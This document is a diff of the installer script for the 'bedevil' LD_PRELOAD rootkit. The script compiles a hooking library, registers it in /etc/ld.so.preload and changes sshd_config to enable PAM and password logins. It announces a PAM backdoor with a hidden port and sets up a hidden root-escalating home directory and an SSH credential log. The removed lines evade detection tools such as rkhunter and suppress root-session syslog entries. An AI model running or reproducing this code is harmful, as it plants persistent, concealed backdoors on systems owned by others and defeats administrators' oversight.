@@ -14,12 +14,13 @@ necho() { printf " [..] $1\n"; }
 [ `which gcc` ] || { eecho "GCC not found"; exit; }
 [ -f /etc/ssh/sshd_config ] || { eecho "/etc/ssh/sshd_config not present."; exit; }
 [[ $(cat /etc/syslinux/config 2>&1 | grep "SELINUX=" | tail -n 1) == *"enforcing"* ]] && eecho "SELinux detected (enforcing)"
+
 [ -d /proc/xen ] && wecho "Xen environment detected"
 [ -d /proc/vz ] && wecho "OpenVZ environment detected"
 [ -f /usr/bin/lveps ] && wecho "CloudLinux LVE detected"
 [[ $(cat /proc/scsi/scsi 2>&1 | grep 'VBOX') == *"VBOX"* ]] && wecho "VirtualBox VM detected"
 
-[ -z $MGID ] && MGID=$RANDOM
+[ -z $MGID ] && MGID=`cat /dev/urandom | tr -dc '1-9' | fold -w 4 | head -n 1`
 [ -z $IDIR ] && IDIR="/lib/bedevil.$RANDOM"
 [ -z $BD_ENV ] && BD_ENV="`cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1`"
 [ -z $LDSO_PRELOAD ] && LDSO_PRELOAD="/etc/ld.so.preload"
@@ -27,34 +28,17 @@ necho() { printf " [..] $1\n"; }
 [ -z $BDVLSO ] && BDVLSO="`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n1`.so"
 [ -z $MDIR ] && MDIR="symbols"
 [ -z $NEW_MDIR ] && NEW_MDIR="${RANDOM}_$MDIR"
-[ -z $LIBHOOKS ] && LIBHOOKS="$NEW_MDIR/lib_hooks"
 [ -z $PLATFORM ] && PLATFORM="`uname -m`"
 
-declare -a array HPROCS=("lsrootkit" "ldd" "unhide" "rkhunter" "chkproc" "chkdirs" "ltrace" "strace" "LD_AUDIT") # hide from these
-declare -a array CFILES=(".ascii" "etc/ssh.sh" "etc/eutils.sh" "etc/README") # local static files to copy over to the install dir
-
-# dependencies
 declare -a array YUM_DEPS=("gcc" "pam-devel" "newt" "libgcc.i686" "glibc-devel.i686" "glibc-devel" "libpcap" "libpcap-devel" "vim-common")
 declare -a array APT_DEPS=("libpam-dev" "libpcap-dev" "gcc-multilib" "build-essential")
 declare -a array PAC_DEPS=("pam" "libpcap" "base-devel")
+declare -a array CFILES=(".ascii" "etc/ssh.sh" "etc/eutils.sh" "etc/README") # files to copy over to the install dir
 
 # populated later on...
 declare -a array HOOKS=()
 declare -a array INT_VARS=()
 declare -a array STR_VARS=()
-
-HELPMSG="
-  Usage: $0 [ -h | -v | -d | -b | -c | -C | -D | -i]
-        -h: Show this help message and exit.
-        -v: Toggle verbose output.
-        -d: Populate rootkit headers with user data.
-        -b: Make bdvl.c.
-        -c: Compile rootkit library in current directory and exit.
-        -C: Clean up installation/compilation mess and exit.
-        -D: Install all potential required dependencies.
-        -i: Launch full installation of bedevil. You will be
-            prompted for input when needed.
-"
 
 asc() { printf '%d' "'$1"; }
 xenc()
@@ -68,10 +52,10 @@ xenc()
     echo -n "$dout"
 }
 
-guserpwd()
+crypt_password()
 {
-    [ ! -z "`which python3`" ] && { echo -n `python3 -c "import crypt;print(crypt.crypt(\"$1\"))"`; return; }
-    echo -n $(openssl passwd -6 -salt `cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 16 | head -n1` $1)
+    [ `which python3` ] && echo -n `python3 -c "import crypt;print(crypt.crypt(\"$1\"))"`
+    [ `which python3` ] || echo -n $(openssl passwd -6 -salt `cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 16 | head -n1` $1)
 }
 
 patch_libdl()
@@ -81,6 +65,11 @@ patch_libdl()
     secho "New ld.so.preload location: $LDSO_PRELOAD"
 }
 
+cleanup_bdvl()
+{
+    secho "Cleaning up local mess."
+    rm -rf $NEW_MDIR bdvl.c *.so.*
+}
 
 install_deps()
 {
@@ -99,7 +88,6 @@ install_deps()
     fi
 }
 
-# $1=name of char array, $2=list, $3=size of array
 build_char_array()
 {
     local nam arr carr asize
@@ -115,41 +103,37 @@ write_char_arrays()
 {
     necho "Building & writing C char arrays for the lib headers"
 
-    local lhc clibchar clibname chooks i
-    lhc=("$(cat $LIBHOOKS)")
-    for lhookd in $lhc; do
-        IFS=':' read -a lhookc <<< "$lhookd"
-        clibname="${lhookc[0]}" # name of lib
-        chooks="${lhookc[1]}" # list of lib symbols
+    local carray_contents array_name array_elements final_char_arrays
+    carray_contents=("$(cat $NEW_MDIR/char_arrays)")
+    for current_array in $carray_contents; do
+        IFS=':' read -a array_creds <<< "$current_array"
+        array_name="${array_creds[0]}" # name of char array
+        array_elements="${array_creds[1]}" # elements of array
 
-        IFS=',' read -a lhooks <<< "$chooks" # sort symbols into a list
-        # build char arrays for each library which symbols we're hooking
-        clibchar+="`build_char_array $clibname "${lhooks[*]}" ${#lhooks[*]}`"
-        # add library symbol names to list so we can build a char array with them all
-        for chook in ${lhooks[@]}; do HOOKS+=("$chook"); done
+        # sort elements into a list and build our char array
+        IFS=',' read -a split_array_elements <<< "$array_elements"
+        final_char_arrays+="`build_char_array $array_name "${split_array_elements[*]}" ${#split_array_elements[*]}`"
+
+        # if the current array isn't an array of symbol names, go next line.
+        [[ $array_name != *"_calls"* ]] && continue
+        # otherwise, add the symbols in the current array to HOOKS
+        for current_hook in ${split_array_elements[@]}; do HOOKS+=("$current_hook"); done
     done
+    
+    # make a char array of all of the symbol names we got, and define index references for each symbol name
+    final_char_arrays+="`build_char_array "all" "${HOOKS[*]}" ${#HOOKS[*]}`"
+    for i in "${!HOOKS[@]}"; do final_char_arrays+="#define C`echo ${HOOKS[i]} | awk '{print toupper($0)}'` $i\n"; done
 
-    clibchar+="`build_char_array "all" "${HOOKS[*]}" ${#HOOKS[*]}`"
-    clibchar+="`build_char_array "hprocs" "${HPROCS[*]}" ${#HPROCS[*]}`"
-
-    i=0
-    for chook in ${HOOKS[@]}; do
-        clibchar+="#define C`echo $chook | awk '{print toupper($0)}'` $i\n"
-        let "i=$i+1"
-    done
-
-    printf "\n$clibchar\n" >> $NEW_MDIR/headers/rk_creds.h
+    printf "\n$final_char_arrays\n" >> $NEW_MDIR/headers/rk_creds.h
 }
 
-# parses 'modules/stconsts' for misc consts that are required by the rk lib but
-# that the user not need have influence over.
 write_sconsts()
 {
     local stconsts cconsts cname cval
     stconsts="`cat $NEW_MDIR/stconsts | grep -o '^[^#]*'`"
 
     necho "Writing background variables"
-    while read -r line; do # go line by line
+    while read -r line; do
         IFS=':' read -a pline <<< "$line" # seperate name and value on line
         cname=${pline[0]} # const name
         cval=${pline[1]} # const value
@@ -162,56 +146,7 @@ write_sconsts()
 
 start_config_wizard()
 {
-    # first we need to find what placeholders are available in our module directory.
-    find_placeholders
-
-    echo
-    secho "Beginning the main user config wizard"
-    necho "You may want to change a couple of the default input settings,"
-    necho "but you can leave a majority of the settings as their defaults."
-    echo
-
-    local RAND_VALUE
-    for var in ${STR_VARS[*]}; do
-        RAND_VALUE="`cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 8 | head -n1`"
-        [[ "$var" == *"IDIR"* ]] && RAND_VALUE=$IDIR
-        [[ "$var" == *"BD_ENV"* ]] && RAND_VALUE=$BD_ENV
-        [[ "$var" == *"SSH_LOGS"* ]] && RAND_VALUE=$SSH_LOGS
-
-        read -p " [..] Variable input for ${var//\?} [$RAND_VALUE]: "
-        if [ ! -z $REPLY ]; then
-            [[ "$var" == *"BD_PWD"* ]] && { PSETTINGS+="\"`xenc $(guserpwd $REPLY)`\":$var "; continue; }
-            PSETTINGS+="\"`xenc $REPLY`\":$var "
-            [[ "$var" == *"IDIR"* ]] && eval IDIR="$REPLY"
-            [[ "$var" == *"BD_ENV"* ]] && eval BD_ENV="$REPLY"
-            [[ "$var" == *"SSH_LOGS"* ]] && eval SSH_LOGS="$REPLY"
-            continue
-        fi
-        [[ "$var" == *"BD_PWD"* ]] && { PSETTINGS+="\"`xenc $(guserpwd $RAND_VALUE)`\":$var "; continue; }
-        PSETTINGS+="\"`xenc $RAND_VALUE`\":$var "
-    done
-
-    for var in ${INT_VARS[*]}; do
-        RAND_VALUE=`cat /dev/urandom | tr -dc '1-9' | fold -w 4 | head -n1`
-        [[ "$var" == *"MGID"* ]] && { let "MGID %= 9999"; RAND_VALUE=$MGID; }
-        
-        read -p " [..] Variable input for ${var//\?} [$RAND_VALUE]: "
-        if [ ! -z $REPLY ]; then
-            PSETTINGS+="$REPLY:$var "
-            [[ "$var" == *"MGID"* ]] && eval MGID=$REPLY
-            continue
-        fi
-        PSETTINGS+="$RAND_VALUE:$var "
-    done
-
-    SOPATH="$IDIR/$BDVLSO.$PLATFORM"
-    secho "End of config wizard.\n"
-    verb $PSETTINGS
-}
-
-find_placeholders()
-{
-	necho "Finding variable placeholders"
+    necho "Finding variable placeholders"
     local HDC CVAR
     HDC=("$(cat $MDIR/headers/rk_creds.h)")
     for w in $HDC; do
@@ -220,11 +155,53 @@ find_placeholders()
         [[ $CVAR == *"\""* ]] && { STR_VARS+=($CVAR); continue; }
         INT_VARS+=($CVAR)
     done
+
+    echo
+    secho "Beginning the main user config wizard"
+    necho "You will want to change a couple of the default input settings"
+    echo
+
+    local input varname
+    for var in ${STR_VARS[*]}; do
+        input="`cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 8 | head -n 1`"
+
+        eval "varname=\"`printf ${var} | tr -d '\"\?,'`\""
+        [ ! -z "`printf "${!varname}"`" ] && input=${!varname}
+
+        read -p " [..] Variable input for ${varname} [$input]: "
+        [ ! -z $REPLY ] && input=$REPLY
+
+        [ ! -z "`printf "$varname"`" ] && eval "$varname=\"$input\""
+        [[ "$var" == *"BD_PWD"* ]] && input="`xenc $(crypt_password $input)`"
+        PSETTINGS+="\"`xenc $input`\":$var "
+    done
+
+    for var in ${INT_VARS[*]}; do
+        input=`cat /dev/urandom | tr -dc '1-9' | fold -w 4 | head -n 1`
+
+        eval "varname=\"`printf ${var} | tr -d '\?'`\""
+        [ ! -z "`printf "${!varname}"`" ] && input=${!varname}
+        
+        read -p " [..] Variable input for ${varname} [$input]: "
+        [ ! -z $REPLY ] && input=$REPLY
+
+        [ ! -z "`printf "$varname"`" ] && eval "$varname=$input"
+        PSETTINGS+="$input:$var "
+    done
+
+    SOPATH="$IDIR/$BDVLSO.$PLATFORM"
+    secho "Configuration finished.\n"
+    verb $PSETTINGS
 }
 
-# $1 = file location of current header.
-overwrite_placeholders()
+populate_new_placeholders()
 {
+    cp -r $MDIR/ $NEW_MDIR/ || { eecho "Couldn't copy module directory."; exit; }
+
+    write_char_arrays
+    start_config_wizard
+    write_sconsts
+
     necho "Overwriting variable placeholders with new settings"
     IFS=' ' read -a PSETTING <<< "$PSETTINGS" # parse current placeholder setting
     for ps in ${PSETTING[@]}; do
@@ -232,30 +209,19 @@ overwrite_placeholders()
         local cx=$(printf ''${cps[0]}'' )
         verb "cps[0]=${cps[0]}" # new value
         verb "cps[1]=${cps[1]}" # old placeholder
-        sed -i "s/${cps[1]}/${cx//x/'\\'\x}/g" $1 # i don't know if this is proper but it works
+        sed -i "s/${cps[1]}/${cx//x/'\\'\x}/g" $NEW_MDIR/headers/rk_creds.h
     done
-}
-
-populate_new_placeholders()
-{
-    # copy module directory to new directory
-    cp -r $MDIR/ $NEW_MDIR/ || { eecho "Couldn't copy module directory."; exit; }
-
-    write_char_arrays
-    start_config_wizard
-    write_sconsts
-    overwrite_placeholders $NEW_MDIR/headers/rk_creds.h
 }
 
 build_bdvlc()
 {
-    local all_includes
+    local all_includes bdvlc
     while read -r line; do all_includes+="#include $line\n"; done <<< "`cat "$MDIR/std_includes" | grep -o '^[^#]*' && cat "$MDIR/symbol_includes" | grep -o '^[^#]*'`"
 
-    local _BDVLC="#define _GNU_SOURCE
+    bdvlc="#define _GNU_SOURCE
 $all_includes
 `cat "$MDIR/prehook.c"`"
-    printf "$_BDVLC" > bdvl.c
+    printf "$bdvlc" > bdvl.c
 }
 
 compile_bdvl()
@@ -263,7 +229,6 @@ compile_bdvl()
     [ ! -d "$NEW_MDIR" ] && { eecho "'$NEW_MDIR' does not exist. Have you populated your new headers?"; exit; }
     
     local WARNING_FLAGS OPTIMIZATION_FLAGS OPTIONS LINKER_OPTIONS LINKER_FLAGS
-
     WARNING_FLAGS="-Wall -Wno-comment -Wno-nonnull-compare"
     OPTIMIZATION_FLAGS="-O0 -g0"
     OPTIONS="-fomit-frame-pointer -fPIC"
@@ -279,21 +244,53 @@ compile_bdvl()
     secho "Shared library compiled. ($BDVLSO.$PLATFORM $(ls -lhN $BDVLSO.$PLATFORM | awk '{print $5}'))" && rm -f bdvl.c
 }
 
-cleanup_bdvl()
+install_bdvl()
 {
-    secho "Cleaning up local mess."
-    rm -rf $NEW_MDIR bdvl.c *.so.*
+    [ ! -z $NOT_ROOT ] && { eecho "You cannot install bedevil without root. Exiting."; exit; }
+
+    secho "Starting full installation!\n"
+
+    wecho "Do you want to patch the dynamic linker?"
+    wecho "If you are doing this, you need to do this now."
+    read -p "`wecho "Patch libdl? [Y/n]: "`" -n 1 -r
+    [[ $REPLY =~ ^[Yy]$ ]] && patch_libdl
+    echo
+
+    read -p "`wecho "Install potential dependencies? [Y/n]: "`" -n 1 -r
+    [[ $REPLY =~ ^[Yy]$ ]] && install_deps
+    echo
+
+    populate_new_placeholders
+    build_bdvlc
+    compile_bdvl
+    
+    # now we have to install the library and make sure it is present in ld.so.preload
+    necho "Installing $BDVLSO to $IDIR"
+    mkdir -p $IDIR/
+    cp $BDVLSO.$PLATFORM $SOPATH
+    cp $BDVLSO.i686 $IDIR/$BDVLSO.i686 2>&1
+
+    [ "$(cat /etc/ssh/sshd_config | grep 'UsePAM')" == "UsePAM yes" ] || echo "UsePAM yes" >> /etc/ssh/sshd_config
+    [ "$(cat /etc/ssh/sshd_config | grep 'PasswordAuthentication yes')" == "PasswordAuthentication yes" ] || sed -i -e 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+
+    necho "Pointing $LDSO_PRELOAD to $SOPATH"
+    [ -f "$LDSO_PRELOAD" ] && chattr -ia $LDSO_PRELOAD &>/dev/null
+    echo -n $SOPATH > $LDSO_PRELOAD
+    secho "Installation successful."
+    cleanup_bdvl
+    echo
+
+    setup_home $IDIR
+    secho "Your PAM backdoor is set up."
+    secho "See 'etc/ssh.sh' on connecting with your hidden port."
 }
 
-# $1 = installation directory (home)
 setup_home()
 {
-    local LBASHRC RBASHRC
-
-    LBASHRC="$1/.bashrc"
-    RBASHRC="tty -s || return
+    export ${BD_ENV}=1
+    local LBASHRC="$1/.bashrc"
+    local RBASHRC="tty -s || return
 [ ! -z \$TERM ] && export TERM=xterm
-unset HISTFILE SAVEHIST TMOUT PROMPT_COMMAND
 [ \$(id -u) != 0 ] && su root
 [ \$(id -u) != 0 ] && kill -9 \$\$
 [ -f ~/etc/README ] && cat ~/etc/README | less && rm ~/etc/README
@@ -313,71 +310,28 @@ echo -e \"\\033[1mSSH logs: \\033[1;31m\$(cat ~/ssh_logs | wc -l)\\033[0m\""
     echo "$RBASHRC" > $LBASHRC
 
     mkdir $1/etc
-    for f in ${CFILES[*]}; do cp $f $1/$f; done # copy array of 'important' static files
+    for f in ${CFILES[*]}; do cp $f $1/$f; done
 
     necho "Hiding rootkit files"
-    touch $SSH_LOGS && chmod 777 $SSH_LOGS && ln -s $SSH_LOGS $1/ssh_logs
+    touch $SSH_LOGS && chmod 666 $SSH_LOGS && ln -s $SSH_LOGS $1/ssh_logs
     chown 0:$MGID $LDSO_PRELOAD $SSH_LOGS $1 $1/* $1/.profile $1/.bashrc $1/.ascii
-
-    necho "Attempting to fix systemd"
-    if [ -d /etc/rsyslog.d ]; then
-        echo 'if ($programname == "systemd" or $programname == "systemd-logind") and (($msg contains "New session" and $msg contains "of user root") or ($msg contains "session opened for user root by (uid=0)") or ($msg contains "Removed session") or ($msg contains "session closed for user root")) then stop'>/etc/rsyslog.d/bdvl_sysd.conf
-        systemctl restart rsyslog
-        secho "New systemd rules written."
-    fi
-}
-
-install_bdvl()
-{
-    [ ! -z $NOT_ROOT ] && { eecho "You cannot install bedevil without root privs. Exiting."; exit; }
-
-    secho "Starting full installation!\n"
-
-    wecho "Do you want to patch the dynamic linker?"
-    necho "This essentially provides libdl a new ld.so.preload file location."
-    wecho "If you are doing this, you need to do this now."
-    
-    read -p "`wecho "Patch libdl? [Y/n]: "`" -n 1 -r
-    if [[ $REPLY =~ ^[Yy]$ ]]; then patch_libdl;
-    else echo; necho "Not patching libdl."; fi
-
-    read -p "`wecho "Install potential dependencies? [Y/n]: "`" -n 1 -r
-    [[ $REPLY =~ ^[Yy]$ ]] && install_deps
-    echo
-
-    populate_new_placeholders
-
-    necho "Compiling the rootkit shared library."
-    build_bdvlc # builds bdvl.c so we can compile the SO
-    compile_bdvl # after this, bdvl.so.* will now exist in the cwd
-
-    export ${BD_ENV}=1
-    
-    # now we have to install the library and make sure it is present in ld.so.preload
-    necho "Installing $BDVLSO to $SOPATH"
-    rm -rf $IDIR/
-    mkdir -p $IDIR/
-    cp $BDVLSO.$PLATFORM $SOPATH
-    cp $BDVLSO.i686 $IDIR/$BDVLSO.i686 2>/dev/null
-
-    necho "Pointing $LDSO_PRELOAD to $SOPATH"
-    [ -f "$LDSO_PRELOAD" ] && chattr -ia $LDSO_PRELOAD &>/dev/null
-
-    [ "$(cat /etc/ssh/sshd_config | grep 'UsePAM')" == "UsePAM yes" ] || echo "UsePAM yes" >> /etc/ssh/sshd_config
-    [ "$(cat /etc/ssh/sshd_config | grep 'PasswordAuthentication yes')" == "PasswordAuthentication yes" ] || sed -i -e 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
-    
-    echo -n $SOPATH > $LDSO_PRELOAD
-    secho "Installation successful."
-    cleanup_bdvl
-    echo
-
-    setup_home $IDIR
-    secho "Your PAM backdoor is set up."
-    secho "See 'etc/ssh.sh' on connecting with your hidden port."
 }
 
 OPTIND=1
 VERBOSE=0
+
+HELPMSG="
+  Usage: $0 [ -h | -v | -d | -b | -c | -C | -D | -i]
+        -h: Show this help message and exit.
+        -v: Toggle verbose output.
+        -d: Populate rootkit headers with user data.
+        -b: Make bdvl.c.
+        -c: Compile rootkit library in current directory and exit.
+        -C: Clean up installation/compilation mess and exit.
+        -D: Install all potential required dependencies.
+        -i: Launch full installation of bedevil. You will be
+            prompted for input when needed.
+"
 
 while getopts "h?vdpcCbiD" opt; do
     case "$opt" in
@@ -385,8 +339,7 @@ while getopts "h?vdpcCbiD" opt; do
         echo "$HELPMSG" && exit
         ;;
     v)
-		secho "Running in verbose mode."
-        VERBOSE=1
+		secho "Running in verbose mode."; VERBOSE=1
         ;;
     d)  
         populate_new_placeholders
